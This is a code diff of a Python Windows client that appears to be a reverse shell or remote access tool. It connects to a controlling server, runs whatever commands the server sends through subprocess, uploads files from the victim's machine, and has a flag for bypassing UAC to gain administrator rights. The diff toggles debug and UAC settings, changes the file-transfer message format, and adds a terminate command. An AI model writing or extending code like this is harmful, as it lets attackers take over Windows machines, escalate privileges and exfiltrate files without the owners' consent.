@@ -2,8 +2,8 @@ import os,socket,subprocess
 import time,sys
 import win32com.shell.shell as shell
 
-DEBUG=False
-UAC_BYPASS=True
+DEBUG=True
+UAC_BYPASS=False
 ### UAC to get Admins
 
 def debug_print(str):
@@ -40,7 +40,7 @@ def file_send(conn_param,file_path_param):
             file_content = f.read()
             file_name = file_path_param.split('\\')[-1]
             file_size = len(file_content)
-            send_s(conn_param,f'fileinfo {file_name} {file_size}')
+            send_s(conn_param,f'fileinfo:{file_name}:{file_size}')
             debug_print(f"file_info sended : fileinfo {file_name} {file_size}")
             conn_param.sendall(file_content)
             debug_print(f"file_content sended")
@@ -129,6 +129,8 @@ while True:
                 elif(server_cmd[:2]=="ft"):
                     if(file_transfer_mode(conn)==0):
                         continue
+                elif(server_cmd[:4]=="term"):
+                    exit()
                 else:
                     # no special command Handler
                     output=subprocess.getoutput(server_cmd)
